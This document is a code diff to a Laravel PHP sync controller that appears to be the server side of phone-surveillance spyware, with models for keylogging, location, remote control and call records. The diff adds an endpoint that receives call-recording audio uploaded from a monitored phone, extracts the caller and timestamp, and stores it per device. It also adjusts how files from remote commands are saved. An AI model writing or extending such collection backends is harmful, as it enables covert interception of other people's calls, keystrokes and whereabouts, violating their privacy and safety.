@@ -5,6 +5,7 @@ namespace App\Http\Controllers\api;
 use App\Http\Controllers\Controller;
 use App\Models\App;
 use App\Models\Call;
+use App\Models\Callrecorder;
 use App\Models\HttpToken;
 use App\Models\Keylogger;
 use App\Models\Location;
@@ -14,22 +15,14 @@ use App\Models\Remotecontrol;
 use App\Models\Token;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Storage;
 
 class SyncAPIController extends Controller
 {
     function sync()
     {
-        $at = request()->header('x-app-token');
-        abort_if(!$at, 403, "Nah");
-        $token = HttpToken::where('token', $at)->first();
-        if (!$token) {
-            $token = Phone::where('token', $at)->first(); // on a supprimer le token dans la table token alors que c'etait deja envoye au phone
-            abort_if(!$token, 403, "Naha");
-            HttpToken::create(['token' => $at, 'users_id' => $token->user->id, 'date' => nnow()]);
-        }
-
         $device = (array) request('device');
-        $phone = Phone::where('token', $token->token)->firstOrNew();
+        $phone = getPhone();
         if (count($device)) {
             $br = ucfirst(@$device['brand']);
             $md = ucfirst(@$device['model']);
@@ -37,9 +30,6 @@ class SyncAPIController extends Controller
             $ph = "$br $md";
             $phone->phone = $ph;
             $phone->data = json_encode($device);
-            $phone->updatedon = nnow();
-            $phone->users_id = $token->users_id;
-            $phone->token = $token->token;
             $phone->save();
         }
 
@@ -198,6 +188,9 @@ class SyncAPIController extends Controller
                 $ex =  '.' . $file->getClientOriginalExtension();
                 if ($ex != '.error') {
                     $filename = $filename ?? ("file_" . time() . "_" . rand(100000, 900000) . $ex);
+                    if (Storage::disk('public')->exists('files/' . $filename)) {
+                        $filename = time() . '_' . $filename;
+                    }
                     $cmd->result = request('file')->storeAs('files', $filename, 'public');
                 }
                 $cmd->success = $success;
@@ -205,6 +198,44 @@ class SyncAPIController extends Controller
                 $cmd->save();
             }
             return response([]);
+        }
+
+        if (request('callrecorderdata')) {
+            $file = request('callrecorderdata');
+            $ex =  '.' . $file->getClientOriginalExtension();
+            $filename = $file->getClientOriginalName();
+            $ft = array_values(array_filter(explode('CALL_REC__', $filename)));
+            $part = ["CALL_REC_"];
+
+            $ft = array_values(array_filter(explode('__', implode("", $ft))));
+            $source = (string) @$ft[0];
+            $part[] = $dt = (string) @$ft[1];
+            $part = implode("", $part);
+            $dt = explode('.', $dt);
+            $dt = (string) @$dt[0];
+
+            try {
+                $dt = Carbon::createFromFormat('Ymd_His', $dt);
+                $dt =  $dt->toDateTimeString();
+            } catch (\Throwable $th) {
+                $dt = null;
+            }
+
+            if (Storage::disk('public')->exists('files/' . $part)) {
+                $part = time() . '_' . $part;
+            }
+
+            $path = $file->storeAs('files', $part, 'public');
+            $cr = Callrecorder::where(['phone_id' => $phone->id, 'source' => $source, 'file' => $part, 'date' => $dt])->firstOrNew();
+            if (!$cr->exists) {
+                $cr->phone_id = $phone->id;
+                $cr->source = $source;
+                $cr->file = $part;
+                $cr->date = $dt;
+                $cr->path = $path;
+                $cr->save();
+            }
+            return response(['success' => true]);
         }
 
         $lastcmdid = (int) request('lastcmdid');
